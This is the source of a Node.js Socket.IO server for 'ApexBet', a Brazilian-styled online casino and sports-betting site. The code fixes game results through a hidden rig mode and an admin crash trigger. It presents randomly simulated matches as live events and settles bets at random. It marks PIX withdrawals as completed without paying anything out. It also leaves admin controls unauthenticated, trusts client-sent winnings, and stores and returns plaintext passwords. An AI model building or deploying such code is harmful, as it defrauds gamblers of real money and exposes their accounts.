import express from 'express';
import http from 'http';
import { Server } from 'socket.io';
import cors from 'cors';
import fs from 'fs';
import path from 'path';
import { fileURLToPath } from 'url';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);
const DB_PATH = path.join(__dirname, 'database.json');

const app = express();
app.use(cors());
app.use(express.json());

const server = http.createServer(app);
const io = new Server(server, {
  cors: { origin: '*', methods: ['GET', 'POST'] }
});

// === PERSISTÊNCIA EM DATABASE.JSON ===
function loadDB() {
  try {
    if (fs.existsSync(DB_PATH)) {
      const raw = JSON.parse(fs.readFileSync(DB_PATH, 'utf-8'));
      return {
        users: raw.users || {},
        pendingDeposits: raw.pendingDeposits || []
      };
    }
  } catch (e) {}
  return { users: {}, pendingDeposits: [] };
}

function saveDB() {
  try {
    fs.writeFileSync(DB_PATH, JSON.stringify(db, null, 2));
  } catch (e) {}
}

let db = loadDB();
let rigMode = 'NORMAL'; // 'NORMAL' | 'FORCE_WIN' | 'FORCE_LOSE'
const socketToUser = new Map();

function ensureUserStats(u) {
  if (typeof u.balance !== 'number') u.balance = 0;
  if (!Array.isArray(u.transactions)) u.transactions = [];
  if (!Array.isArray(u.sportBets)) u.sportBets = [];
  if (typeof u.totalWagered !== 'number') {
    u.totalWagered = u.transactions
      .filter((t) => t.amount < 0 && t.type !== 'WITHDRAW')
      .reduce((acc, t) => acc + Math.abs(t.amount), 0);
  }
  if (typeof u.totalDeposited !== 'number') {
    u.totalDeposited = u.transactions
      .filter((t) => t.type === 'DEPOSIT')
      .reduce((acc, t) => acc + t.amount, 0);
  }
  if (typeof u.totalWithdrawn !== 'number') {
    u.totalWithdrawn = u.transactions
      .filter((t) => t.type === 'WITHDRAW')
      .reduce((acc, t) => acc + Math.abs(t.amount), 0);
  }
  if (typeof u.totalWon !== 'number') {
    u.totalWon = u.transactions
      .filter((t) => t.amount > 0 && t.type !== 'DEPOSIT')
      .reduce((acc, t) => acc + t.amount, 0);
  }
  if (!u.createdAt) {
    u.createdAt = new Date().toLocaleDateString('pt-BR');
  }
}

function recordTx(u, { type, title, amount, status = 'Concluído', key = '' }) {
  ensureUserStats(u);
  const tx = {
    id: `TX${Date.now().toString().slice(-6)}${Math.floor(Math.random() * 90 + 10)}`,
    type,
    title,
    amount: +Number(amount).toFixed(2),
    status,
    key,
    time: new Date().toLocaleTimeString('pt-BR', { hour: '2-digit', minute: '2-digit', second: '2-digit' })
  };
  u.transactions.unshift(tx);
  if (u.transactions.length > 80) u.transactions.pop();

  if (amount < 0 && type !== 'WITHDRAW') {
    u.totalWagered = +(u.totalWagered + Math.abs(amount)).toFixed(2);
  } else if (type === 'DEPOSIT' && amount > 0) {
    u.totalDeposited = +(u.totalDeposited + amount).toFixed(2);
  } else if (type === 'WITHDRAW' && amount < 0) {
    u.totalWithdrawn = +(u.totalWithdrawn + Math.abs(amount)).toFixed(2);
  } else if (amount > 0 && type !== 'DEPOSIT') {
    u.totalWon = +(u.totalWon + amount).toFixed(2);
  }
  return tx;
}

function syncUserToSockets(userKey) {
  const u = db.users[userKey];
  if (!u) return;
  ensureUserStats(u);
  for (const [sockId, key] of socketToUser.entries()) {
    if (key === userKey) {
      io.to(sockId).emit('user:sync', u);
    }
  }
}

function broadcastAdminState() {
  const onlineKeys = new Set(socketToUser.values());
  const usersList = Object.values(db.users).map((u) => {
    ensureUserStats(u);
    return {
      key: u.key,
      name: u.name,
      accountId: u.accountId,
      balance: u.balance,
      totalWagered: u.totalWagered,
      online: onlineKeys.has(u.key)
    };
  });
  io.emit('admin:state', { users: usersList, pendingDeposits: db.pendingDeposits });
}

// === MOTOR DE ESPORTES EM TEMPO REAL ===
let liveMatches = [
  {
    id: 'm1',
    sport: 'Futebol',
    league: 'Brasileirão Série A',
    home: 'Flamengo',
    away: 'Palmeiras',
    scoreHome: 1,
    scoreAway: 1,
    score: '1 - 1',
    live: true,
    minute: 64,
    second: 18,
    period: '2º Tempo',
    time: "64:18 • 2ºT",
    oddHome: 2.15,
    oddDraw: 3.10,
    oddAway: 3.45,
    trendHome: 'none',
    trendDraw: 'none',
    trendAway: 'none',
    suspended: false,
    stats: { possessionHome: 56, possessionAway: 44, shotsHome: 11, shotsAway: 8, cornersHome: 6, cornersAway: 4 },
    extraMarkets: {
      over25: 1.72,
      under25: 2.08,
      bttsYes: 1.45,
      bttsNo: 2.60,
      dc1X: 1.30,
      dc12: 1.36,
      dcX2: 1.65,
      handicapHome: 3.85,
      handicapAway: 1.24
    }
  },
  {
    id: 'm2',
    sport: 'Futebol',
    league: 'UEFA Champions League',
    home: 'Real Madrid',
    away: 'Manchester City',
    scoreHome: 2,
    scoreAway: 2,
    score: '2 - 2',
    live: true,
    minute: 78,
    second: 42,
    period: '2º Tempo',
    time: "78:42 • 2ºT",
    oddHome: 2.40,
    oddDraw: 2.85,
    oddAway: 2.95,
    trendHome: 'none',
    trendDraw: 'none',
    trendAway: 'none',
    suspended: false,
    stats: { possessionHome: 47, possessionAway: 53, shotsHome: 14, shotsAway: 16, cornersHome: 5, cornersAway: 9 },
    extraMarkets: {
      over25: 1.22,
      under25: 3.90,
      bttsYes: 1.15,
      bttsNo: 4.80,
      dc1X: 1.38,
      dc12: 1.40,
      dcX2: 1.52,
      handicapHome: 4.50,
      handicapAway: 1.18
    }
  },
  {
    id: 'm3',
    sport: 'Futebol',
    league: 'Premier League',
    home: 'Arsenal',
    away: 'Liverpool',
    scoreHome: 1,
    scoreAway: 0,
    score: '1 - 0',
    live: true,
    minute: 37,
    second: 10,
    period: '1º Tempo',
    time: "37:10 • 1ºT",
    oddHome: 1.68,
    oddDraw: 3.75,
    oddAway: 4.90,
    trendHome: 'none',
    trendDraw: 'none',
    trendAway: 'none',
    suspended: false,
    stats: { possessionHome: 58, possessionAway: 42, shotsHome: 7, shotsAway: 3, cornersHome: 4, cornersAway: 1 },
    extraMarkets: {
      over25: 1.85,
      under25: 1.92,
      bttsYes: 1.78,
      bttsNo: 1.98,
      dc1X: 1.16,
      dc12: 1.25,
      dcX2: 2.12,
      handicapHome: 2.85,
      handicapAway: 1.40
    }
  },
  {
    id: 'm4',
    sport: 'Basquete',
    league: 'NBA • Temporada Regular',
    home: 'LA Lakers',
    away: 'Boston Celtics',
    scoreHome: 94,
    scoreAway: 91,
    score: '94 - 91',
    live: true,
    minute: 6,
    second: 45,
    period: '4º Quarto',
    time: "Q4 • 06:45",
    oddHome: 1.74,
    oddDraw: null,
    oddAway: 2.08,
    trendHome: 'none',
    trendDraw: 'none',
    trendAway: 'none',
    suspended: false,
    stats: { possessionHome: 51, possessionAway: 49, shotsHome: 42, shotsAway: 39, cornersHome: 12, cornersAway: 14 },
    extraMarkets: {
      over25: 1.90,
      under25: 1.90,
      bttsYes: 1.85,
      bttsNo: 1.95,
      dc1X: 1.74,
      dc12: 1.01,
      dcX2: 2.08,
      handicapHome: 2.35,
      handicapAway: 1.58
    }
  },
  {
    id: 'm5',
    sport: 'Basquete',
    league: 'NBB Caixa',
    home: 'Franca Basquete',
    away: 'Sesi Bauru',
    scoreHome: 68,
    scoreAway: 62,
    score: '68 - 62',
    live: true,
    minute: 3,
    second: 20,
    period: '3º Quarto',
    time: "Q3 • 03:20",
    oddHome: 1.42,
    oddDraw: null,
    oddAway: 2.75,
    trendHome: 'none',
    trendDraw: 'none',
    trendAway: 'none',
    suspended: false,
    stats: { possessionHome: 54, possessionAway: 46, shotsHome: 31, shotsAway: 27, cornersHome: 9, cornersAway: 7 },
    extraMarkets: {
      over25: 1.88,
      under25: 1.92,
      bttsYes: 1.80,
      bttsNo: 1.98,
      dc1X: 1.42,
      dc12: 1.01,
      dcX2: 2.75,
      handicapHome: 1.95,
      handicapAway: 1.82
    }
  },
  {
    id: 'm6',
    sport: 'Tênis',
    league: 'ATP Finals • Quadra Dura',
    home: 'Carlos Alcaraz',
    away: 'Jannik Sinner',
    scoreHome: 1,
    scoreAway: 1,
    score: '6-4, 4-6 (4-3)',
    live: true,
    minute: 2,
    second: 15,
    period: 'Set 3',
    time: "Set 3 • Game 8",
    oddHome: 1.88,
    oddDraw: null,
    oddAway: 1.92,
    trendHome: 'none',
    trendDraw: 'none',
    trendAway: 'none',
    suspended: false,
    stats: { possessionHome: 50, possessionAway: 50, shotsHome: 14, shotsAway: 16, cornersHome: 5, cornersAway: 4 },
    extraMarkets: {
      over25: 1.75,
      under25: 2.02,
      bttsYes: 1.65,
      bttsNo: 2.15,
      dc1X: 1.88,
      dc12: 1.01,
      dcX2: 1.92,
      handicapHome: 2.50,
      handicapAway: 1.50
    }
  },
  {
    id: 'm7',
    sport: 'eSports',
    league: 'CS2 • IEM Rio Major',
    home: 'FURIA',
    away: 'Natus Vincere',
    scoreHome: 11,
    scoreAway: 9,
    score: '11 - 9',
    live: true,
    minute: 21,
    second: 10,
    period: 'Mapa 2 (Mirage)',
    time: "Mapa 2 • R21",
    oddHome: 1.62,
    oddDraw: null,
    oddAway: 2.25,
    trendHome: 'none',
    trendDraw: 'none',
    trendAway: 'none',
    suspended: false,
    stats: { possessionHome: 55, possessionAway: 45, shotsHome: 74, shotsAway: 68, cornersHome: 8, cornersAway: 6 },
    extraMarkets: {
      over25: 1.80,
      under25: 1.96,
      bttsYes: 1.70,
      bttsNo: 2.05,
      dc1X: 1.62,
      dc12: 1.01,
      dcX2: 2.25,
      handicapHome: 2.20,
      handicapAway: 1.65
    }
  },
  {
    id: 'm8',
    sport: 'UFC / MMA',
    league: 'UFC Fight Night • Peso Meio-Pesado',
    home: 'Alex Poatan',
    away: 'Magomed Ankalaev',
    scoreHome: 2,
    scoreAway: 1,
    score: 'Round 3',
    live: true,
    minute: 3,
    second: 48,
    period: 'Round 3 / 5',
    time: "R3 • 03:48",
    oddHome: 1.55,
    oddDraw: null,
    oddAway: 2.45,
    trendHome: 'none',
    trendDraw: 'none',
    trendAway: 'none',
    suspended: false,
    stats: { possessionHome: 53, possessionAway: 47, shotsHome: 64, shotsAway: 41, cornersHome: 2, cornersAway: 0 },
    extraMarkets: {
      over25: 2.10,
      under25: 1.70,
      bttsYes: 1.90,
      bttsNo: 1.85,
      dc1X: 1.55,
      dc12: 1.01,
      dcX2: 2.45,
      handicapHome: 2.05,
      handicapAway: 1.75
    }
  }
];

function jitterOdd(val) {
  if (!val) return null;
  const delta = (Math.random() - 0.5) * 0.14;
  return +Math.max(1.08, Math.min(18.0, val + delta)).toFixed(2);
}

// Loop em tempo real dos jogos esportivos (a cada 2 segundos)
setInterval(() => {
  let liveAlert = null;

  liveMatches = liveMatches.map((m) => {
    const next = { ...m, trendHome: 'none', trendDraw: 'none', trendAway: 'none' };

    // Avança cronômetro real
    next.second += 2;
    if (next.second >= 60) {
      next.second = 0;
      next.minute += 1;
      if (next.sport === 'Futebol' && next.minute > 92) {
        next.minute = 1;
        next.period = '1º Tempo';
        next.scoreHome = 0;
        next.scoreAway = 0;
        next.score = '0 - 0';
      }
    }

    const mm = String(next.minute).padStart(2, '0');
    const ss = String(next.second).padStart(2, '0');
    if (next.sport === 'Futebol') {
      next.period = next.minute <= 45 ? '1º Tempo' : '2º Tempo';
      next.time = `${mm}:${ss} • ${next.minute <= 45 ? '1ºT' : '2ºT'}`;
    } else if (next.sport === 'Basquete') {
      next.time = `Q4 • ${mm}:${ss}`;
    } else if (next.sport === 'UFC / MMA') {
      next.time = `R3 • ${mm}:${ss}`;
    } else if (next.sport === 'eSports') {
      next.time = `Mapa 2 • R${next.scoreHome + next.scoreAway + 1}`;
    }

    // Reativa mercados caso estivessem suspensos por gol/ponto
    if (next.suspended) {
      next.suspended = false;
    }

    // Chance de evento real ao vivo (Gol, Cesta, Round)
    const eventRoll = Math.random();
    if (next.sport === 'Futebol' && eventRoll < 0.035) {
      const homeScored = Math.random() < 0.52;
      if (homeScored) next.scoreHome += 1;
      else next.scoreAway += 1;
      next.score = `${next.scoreHome} - ${next.scoreAway}`;
      next.suspended = true;
      liveAlert = `⚽ GOL! ${next.home} ${next.scoreHome} x ${next.scoreAway} ${next.away} (${mm}')`;
    } else if (next.sport === 'Basquete' && eventRoll < 0.25) {
      const pts = Math.random() < 0.35 ? 3 : 2;
      if (Math.random() < 0.5) next.scoreHome += pts;
      else next.scoreAway += pts;
      next.score = `${next.scoreHome} - ${next.scoreAway}`;
      if (pts === 3) {
        liveAlert = `🏀 CESTA DE 3! ${next.home} ${next.scoreHome} x ${next.scoreAway} ${next.away}`;
      }
    } else if (next.sport === 'eSports' && eventRoll < 0.06) {
      if (Math.random() < 0.52) next.scoreHome += 1;
      else next.scoreAway += 1;
      if (next.scoreHome >= 13 || next.scoreAway >= 13) {
        next.scoreHome = 0;
        next.scoreAway = 0;
      }
      next.score = `${next.scoreHome} - ${next.scoreAway}`;
      liveAlert = `🎯 ROUND! ${next.home} ${next.scoreHome} x ${next.scoreAway} ${next.away}`;
    }

    // Oscilação dinâmica das odds em tempo real
    if (Math.random() < 0.45) {
      const newH = jitterOdd(next.oddHome);
      if (newH > next.oddHome) next.trendHome = 'up';
      else if (newH < next.oddHome) next.trendHome = 'down';
      next.oddHome = newH;

      if (next.oddDraw) {
        const newD = jitterOdd(next.oddDraw);
        if (newD > next.oddDraw) next.trendDraw = 'up';
        else if (newD < next.oddDraw) next.trendDraw = 'down';
        next.oddDraw = newD;
      }

      const newA = jitterOdd(next.oddAway);
      if (newA > next.oddAway) next.trendAway = 'up';
      else if (newA < next.oddAway) next.trendAway = 'down';
      next.oddAway = newA;

      next.extraMarkets = {
        ...next.extraMarkets,
        over25: jitterOdd(next.extraMarkets.over25),
        under25: jitterOdd(next.extraMarkets.under25),
        bttsYes: jitterOdd(next.extraMarkets.bttsYes),
        bttsNo: jitterOdd(next.extraMarkets.bttsNo)
      };
    }

    return next;
  });

  // Atualiza valor de Cash Out ao vivo dos bilhetes em aberto
  let anyUserUpdated = false;
  for (const u of Object.values(db.users)) {
    if (!Array.isArray(u.sportBets)) continue;
    let changed = false;
    u.sportBets.forEach((bet) => {
      if (bet.status === 'OPEN') {
        const drift = 0.88 + Math.random() * 0.28;
        bet.cashoutValue = +Math.max(1, bet.stake * drift).toFixed(2);
        changed = true;
      }
    });
    if (changed) {
      anyUserUpdated = true;
      syncUserToSockets(u.key);
    }
  }
  if (anyUserUpdated) saveDB();

  io.emit('sports:tick', { matches: liveMatches, liveAlert });
}, 2000);

// === CRASH (AVIATOR) ===
let crashState = { status: 'WAITING', multiplier: 1.0, history: [2.41, 1.18, 8.92, 1.54, 3.1] };
let crashTarget = 2.0;

function runCrashLoop() {
  crashState.status = 'WAITING';
  crashState.multiplier = 1.0;
  io.emit('crash:tick', crashState);

  setTimeout(() => {
    crashState.status = 'RUNNING';
    if (rigMode === 'FORCE_LOSE') {
      crashTarget = +(1.02 + Math.random() * 0.12).toFixed(2);
      rigMode = 'NORMAL';
    } else if (rigMode === 'FORCE_WIN') {
      crashTarget = +(5.0 + Math.random() * 8.0).toFixed(2);
      rigMode = 'NORMAL';
    } else {
      const r = Math.random();
      crashTarget = r < 0.35 ? +(1.05 + Math.random() * 0.6).toFixed(2) : +(1.5 + Math.random() * 6.5).toFixed(2);
    }

    const flight = setInterval(() => {
      if (crashState.status !== 'RUNNING') {
        clearInterval(flight);
        return;
      }
      crashState.multiplier = +(crashState.multiplier + 0.03 + crashState.multiplier * 0.015).toFixed(2);
      if (crashState.multiplier >= crashTarget) {
        clearInterval(flight);
        crashState.status = 'CRASHED';
        crashState.history = [crashState.multiplier, ...crashState.history.slice(0, 11)];
        io.emit('crash:tick', crashState);
        setTimeout(runCrashLoop, 3200);
      } else {
        io.emit('crash:tick', crashState);
      }
    }, 100);
  }, 4500);
}
runCrashLoop();

// === MINES EM MEMÓRIA ===
const activeMines = new Map();

// === CONEXÃO SOCKET.IO ===
io.on('connection', (socket) => {
  socket.emit('server:boot', { matches: liveMatches, crashState });

  socket.on('auth:register', ({ fullName, loginKey, password }) => {
    const key = String(loginKey || '').trim().toLowerCase();
    if (!key || !password || !fullName) {
      return socket.emit('auth:error', 'Preencha todos os campos obrigatórios.');
    }
    if (db.users[key]) {
      return socket.emit('auth:error', 'Este CPF ou E-mail já possui cadastro. Faça login.');
    }
    const newUser = {
      key,
      name: fullName.trim(),
      password,
      accountId: Math.floor(100000 + Math.random() * 900000).toString(),
      balance: 0.0,
      totalWagered: 0,
      totalDeposited: 0,
      totalWithdrawn: 0,
      totalWon: 0,
      createdAt: new Date().toLocaleDateString('pt-BR'),
      transactions: [],
      sportBets: []
    };
    db.users[key] = newUser;
    saveDB();
    socketToUser.set(socket.id, key);
    socket.emit('auth:success', newUser);
    broadcastAdminState();
  });

  socket.on('auth:login', ({ loginKey, password }) => {
    const key = String(loginKey || '').trim().toLowerCase();
    const u = db.users[key];
    if (!u) {
      return socket.emit('auth:error', 'Conta não encontrada. Clique em "Criar Conta" para se cadastrar.');
    }
    if (u.password !== password) {
      return socket.emit('auth:error', 'Senha incorreta. Tente novamente.');
    }
    ensureUserStats(u);
    saveDB();
    socketToUser.set(socket.id, key);
    socket.emit('auth:success', u);
    broadcastAdminState();
  });

  socket.on('auth:logout', () => {
    socketToUser.delete(socket.id);
    broadcastAdminState();
  });

  // === SLOTS PG SOFT ===
  socket.on('slot:spin', (betRaw) => {
    const key = socketToUser.get(socket.id);
    const u = db.users[key];
    const bet = Number(betRaw);
    if (!u || bet <= 0 || u.balance < bet) return;

    u.balance = +(u.balance - bet).toFixed(2);
    recordTx(u, { type: 'BET', title: 'Aposta PG Soft Slot', amount: -bet });

    const pool = ['COIN', 'ENVELOPE', 'JADE', 'INGOT', 'TIGER', 'WILD'];
    let grid = Array.from({ length: 3 }, () =>
      Array.from({ length: 3 }, () => pool[Math.floor(Math.random() * pool.length)])
    );

    if (rigMode === 'FORCE_WIN') {
      grid[1] = ['TIGER', 'TIGER', 'TIGER'];
      rigMode = 'NORMAL';
    } else if (rigMode === 'FORCE_LOSE') {
      grid = [
        ['COIN', 'JADE', 'INGOT'],
        ['ENVELOPE', 'COIN', 'JADE'],
        ['INGOT', 'ENVELOPE', 'COIN']
      ];
      rigMode = 'NORMAL';
    }

    const lines = [
      [[1, 0], [1, 1], [1, 2]],
      [[0, 0], [0, 1], [0, 2]],
      [[2, 0], [2, 1], [2, 2]],
      [[0, 0], [1, 1], [2, 2]],
      [[2, 0], [1, 1], [0, 2]]
    ];
    const multMap = { COIN: 2, ENVELOPE: 3, JADE: 5, INGOT: 8, TIGER: 15, WILD: 25 };

    let totalMult = 0;
    const winningLines = [];
    lines.forEach((coords, idx) => {
      const syms = coords.map(([r, c]) => grid[r][c]);
      const nonWild = syms.filter((s) => s !== 'WILD');
      if (nonWild.length === 0 || nonWild.every((s) => s === nonWild[0])) {
        const baseSym = nonWild[0] || 'WILD';
        totalMult += multMap[baseSym] || 2;
        winningLines.push(idx);
      }
    });

    const winAmount = +(bet * totalMult).toFixed(2);
    if (winAmount > 0) {
      u.balance = +(u.balance + winAmount).toFixed(2);
      recordTx(u, { type: 'WIN', title: `Prêmio PG Soft (${totalMult}x)`, amount: winAmount });
    }

    saveDB();
    broadcastAdminState();
    socket.emit('slot:result', {
      grid,
      winAmount,
      winningLines,
      isMegaWin: totalMult >= 10,
      balance: u.balance,
      transactions: u.transactions,
      totalWagered: u.totalWagered,
      totalWon: u.totalWon
    });
  });

  // === DOUBLE ===
  socket.on('double:spin', ({ bet: betRaw, color }) => {
    const key = socketToUser.get(socket.id);
    const u = db.users[key];
    const bet = Number(betRaw);
    if (!u || bet <= 0 || u.balance < bet) return;

    u.balance = +(u.balance - bet).toFixed(2);
    recordTx(u, { type: 'BET', title: `Aposta Double (${color.toUpperCase()})`, amount: -bet });

    let rolledNumber = Math.floor(Math.random() * 15);
    const getColor = (n) => (n === 0 ? 'white' : n <= 7 ? 'red' : 'black');

    if (rigMode === 'FORCE_WIN') {
      rolledNumber = color === 'white' ? 0 : color === 'red' ? 3 : 11;
      rigMode = 'NORMAL';
    } else if (rigMode === 'FORCE_LOSE') {
      rolledNumber = color === 'red' ? 11 : 3;
      rigMode = 'NORMAL';
    }

    const rolledColor = getColor(rolledNumber);
    let winAmount = 0;
    if (rolledColor === color) {
      const mult = color === 'white' ? 14 : 2;
      winAmount = +(bet * mult).toFixed(2);
      u.balance = +(u.balance + winAmount).toFixed(2);
      recordTx(u, { type: 'WIN', title: `Prêmio Double (${mult}x)`, amount: winAmount });
    }

    saveDB();
    broadcastAdminState();
    socket.emit('double:result', {
      rolledNumber,
      rolledColor,
      winAmount,
      balance: u.balance,
      transactions: u.transactions
    });
  });

  // === MINES ===
  socket.on('mines:start', ({ bet: betRaw, minesCount }) => {
    const key = socketToUser.get(socket.id);
    const u = db.users[key];
    const bet = Number(betRaw);
    const count = Math.min(20, Math.max(1, Number(minesCount)));
    if (!u || bet <= 0 || u.balance < bet) return;

    u.balance = +(u.balance - bet).toFixed(2);
    recordTx(u, { type: 'BET', title: `Aposta Mines (${count} minas)`, amount: -bet });
    saveDB();
    broadcastAdminState();

    const bombs = Array(25).fill(false);
    let placed = 0;
    while (placed < count) {
      const idx = Math.floor(Math.random() * 25);
      if (!bombs[idx]) {
        bombs[idx] = true;
        placed++;
      }
    }

    const nextMult = +(1 + count * 0.08).toFixed(2);
    activeMines.set(socket.id, { bet, count, bombs, revealed: [], multiplier: 1.0 });
    socket.emit('mines:state', { revealed: [], multiplier: 1.0, nextMultiplier: nextMult, balance: u.balance });
  });

  socket.on('mines:reveal', (idx) => {
    const game = activeMines.get(socket.id);
    const key = socketToUser.get(socket.id);
    const u = db.users[key];
    if (!game || !u || game.revealed.includes(idx)) return;

    let isBomb = game.bombs[idx];
    if (rigMode === 'FORCE_LOSE') {
      isBomb = true;
      game.bombs[idx] = true;
      rigMode = 'NORMAL';
    } else if (rigMode === 'FORCE_WIN' && isBomb) {
      isBomb = false;
      game.bombs[idx] = false;
      rigMode = 'NORMAL';
    }

    if (isBomb) {
      activeMines.delete(socket.id);
      socket.emit('mines:gameover', { bombs: game.bombs, revealed: game.revealed, balance: u.balance });
      return;
    }

    game.revealed.push(idx);
    const stepGain = 0.08 + game.count * 0.045;
    game.multiplier = +(game.multiplier * (1 + stepGain)).toFixed(2);
    const nextMultiplier = +(game.multiplier * (1 + stepGain)).toFixed(2);

    socket.emit('mines:state', {
      revealed: game.revealed,
      multiplier: game.multiplier,
      nextMultiplier,
      balance: u.balance
    });
  });

  socket.on('mines:cashout', () => {
    const game = activeMines.get(socket.id);
    const key = socketToUser.get(socket.id);
    const u = db.users[key];
    if (!game || !u || game.revealed.length === 0) return;

    const winAmount = +(game.bet * game.multiplier).toFixed(2);
    u.balance = +(u.balance + winAmount).toFixed(2);
    recordTx(u, { type: 'WIN', title: `Retirada Mines (${game.multiplier.toFixed(2)}x)`, amount: winAmount });
    saveDB();
    broadcastAdminState();
    activeMines.delete(socket.id);

    socket.emit('mines:cashedout', {
      winAmount,
      multiplier: game.multiplier,
      bombs: game.bombs,
      revealed: game.revealed,
      balance: u.balance,
      transactions: u.transactions
    });
  });

  // === CRASH ===
  socket.on('crash:bet', ({ amount }) => {
    const key = socketToUser.get(socket.id);
    const u = db.users[key];
    const bet = Number(amount);
    if (!u || bet <= 0 || u.balance < bet) return;

    u.balance = +(u.balance - bet).toFixed(2);
    recordTx(u, { type: 'BET', title: 'Aposta Aviator', amount: -bet });
    saveDB();
    broadcastAdminState();
    syncUserToSockets(key);
  });

  socket.on('crash:cashout', ({ winAmount, multiplier }) => {
    const key = socketToUser.get(socket.id);
    const u = db.users[key];
    const win = Number(winAmount);
    if (!u || win <= 0) return;

    u.balance = +(u.balance + win).toFixed(2);
    recordTx(u, { type: 'WIN', title: `Saque Aviator (${Number(multiplier).toFixed(2)}x)`, amount: win });
    saveDB();
    broadcastAdminState();
    syncUserToSockets(key);
  });

  // === ESPORTES (SIMPLES, MÚLTIPLA E CASH OUT EM TEMPO REAL) ===
  socket.on('sports:bet', ({ selections, stake: stakeRaw, label, odd }) => {
    const key = socketToUser.get(socket.id);
    const u = db.users[key];
    const stake = Number(stakeRaw);
    if (!u || stake <= 0 || u.balance < stake) return;

    ensureUserStats(u);
    const items = Array.isArray(selections) && selections.length > 0
      ? selections
      : [{ matchTitle: 'Esportes ao Vivo', market: 'Resultado Final', label, odd: Number(odd) }];

    const totalOdd = +items.reduce((acc, item) => acc * Number(item.odd), 1).toFixed(2);
    const potentialWin = +(stake * totalOdd).toFixed(2);

    u.balance = +(u.balance - stake).toFixed(2);
    const betTitle = items.length > 1
      ? `Múltipla (${items.length} seleções @ ${totalOdd}x)`
      : `Aposta Esportiva: ${items[0].label} (@ ${totalOdd}x)`;

    recordTx(u, { type: 'SPORT_BET', title: betTitle, amount: -stake });

    const ticket = {
      id: `SPT${Date.now().toString().slice(-6)}`,
      type: items.length > 1 ? 'Múltipla' : 'Simples',
      selections: items,
      stake,
      totalOdd,
      potentialWin,
      cashoutValue: +(stake * 0.92).toFixed(2),
      status: 'OPEN', // 'OPEN' | 'WON' | 'LOST' | 'CASHED_OUT'
      createdAt: new Date().toLocaleTimeString('pt-BR', { hour: '2-digit', minute: '2-digit' })
    };

    u.sportBets.unshift(ticket);
    saveDB();
    broadcastAdminState();
    syncUserToSockets(key);

    // Liquidação automática em tempo real após 25 segundos caso não faça Cash Out
    setTimeout(() => {
      const currentUser = db.users[key];
      if (!currentUser) return;
      const targetTicket = currentUser.sportBets.find((b) => b.id === ticket.id);
      if (!targetTicket || targetTicket.status !== 'OPEN') return;

      const winChance = rigMode === 'FORCE_WIN' ? 1 : rigMode === 'FORCE_LOSE' ? 0 : Math.min(0.65, 1 / totalOdd + 0.15);
      if (rigMode !== 'NORMAL') rigMode = 'NORMAL';

      if (Math.random() < winChance) {
        targetTicket.status = 'WON';
        currentUser.balance = +(currentUser.balance + potentialWin).toFixed(2);
        recordTx(currentUser, {
          type: 'WIN',
          title: `Bilhete Ganho #${ticket.id} (${totalOdd}x)`,
          amount: potentialWin
        });
        io.to(socket.id).emit('app:toast', `🏆 Bilhete #${ticket.id} GANHOU + R$ ${potentialWin.toFixed(2)}!`);
      } else {
        targetTicket.status = 'LOST';
      }
      saveDB();
      broadcastAdminState();
      syncUserToSockets(key);
    }, 25000);
  });

  socket.on('sports:cashout', ({ ticketId }) => {
    const key = socketToUser.get(socket.id);
    const u = db.users[key];
    if (!u) return;
    ensureUserStats(u);

    const ticket = u.sportBets.find((b) => b.id === ticketId && b.status === 'OPEN');
    if (!ticket) return;

    const val = Number(ticket.cashoutValue || ticket.stake * 0.9);
    ticket.status = 'CASHED_OUT';
    u.balance = +(u.balance + val).toFixed(2);
    recordTx(u, { type: 'WIN', title: `Cash Out Esportivo #${ticket.id}`, amount: val });

    saveDB();
    broadcastAdminState();
    syncUserToSockets(key);
    socket.emit('app:toast', `Cash Out realizado: + R$ ${val.toFixed(2)}`);
  });

  // === CARTEIRA PIX ===
  socket.on('wallet:requestDeposit', ({ amount }) => {
    const key = socketToUser.get(socket.id);
    const u = db.users[key];
    if (!u) return;

    const dep = {
      id: `PIX${Date.now().toString().slice(-6)}`,
      userKey: key,
      userName: u.name,
      amount: Number(amount),
      time: new Date().toLocaleTimeString('pt-BR', { hour: '2-digit', minute: '2-digit' })
    };
    db.pendingDeposits.unshift(dep);
    saveDB();
    broadcastAdminState();
  });

  socket.on('wallet:withdraw', ({ pixKey, amount }) => {
    const key = socketToUser.get(socket.id);
    const u = db.users[key];
    const val = Number(amount);
    if (!u || val <= 0 || u.balance < val) return;

    u.balance = +(u.balance - val).toFixed(2);
    const tx = recordTx(u, {
      type: 'WITHDRAW',
      title: 'Saque via PIX',
      amount: -val,
      status: 'Concluído',
      key: pixKey
    });
    saveDB();
    broadcastAdminState();
    syncUserToSockets(key);
    socket.emit('wallet:withdrawReceipt', tx);
  });

  // === ADMIN ===
  socket.on('admin:getState', () => {
    broadcastAdminState();
  });

  socket.on('admin:approveDeposit', ({ depositId }) => {
    const idx = db.pendingDeposits.findIndex((d) => d.id === depositId);
    if (idx === -1) return;
    const dep = db.pendingDeposits[idx];
    db.pendingDeposits.splice(idx, 1);

    const u = db.users[dep.userKey];
    if (u) {
      u.balance = +(u.balance + dep.amount).toFixed(2);
      recordTx(u, { type: 'DEPOSIT', title: 'Depósito PIX Confirmado', amount: dep.amount });
      syncUserToSockets(u.key);
    }
    saveDB();
    broadcastAdminState();
  });

  socket.on('admin:setUserBalance', ({ userKey, amount }) => {
    const u = db.users[userKey];
    if (!u) return;
    u.balance = +Number(amount).toFixed(2);
    saveDB();
    broadcastAdminState();
    syncUserToSockets(userKey);
  });

  socket.on('admin:addUserBalance', ({ userKey, delta }) => {
    const u = db.users[userKey];
    if (!u) return;
    u.balance = +Math.max(0, u.balance + Number(delta)).toFixed(2);
    saveDB();
    broadcastAdminState();
    syncUserToSockets(userKey);
  });

  socket.on('admin:setRig', (mode) => {
    rigMode = mode;
  });

  socket.on('admin:explodeNow', () => {
    if (crashState.status === 'RUNNING') {
      crashTarget = crashState.multiplier;
    }
  });

  socket.on('admin:broadcastToast', (msg) => {
    io.emit('app:toast', msg);
  });

  socket.on('disconnect', () => {
    socketToUser.delete(socket.id);
    broadcastAdminState();
  });
});

const PORT = process.env.PORT || 3001;
server.listen(PORT, '0.0.0.0', () => {
  console.log(`Servidor ApexBet rodando na porta ${PORT}`);
});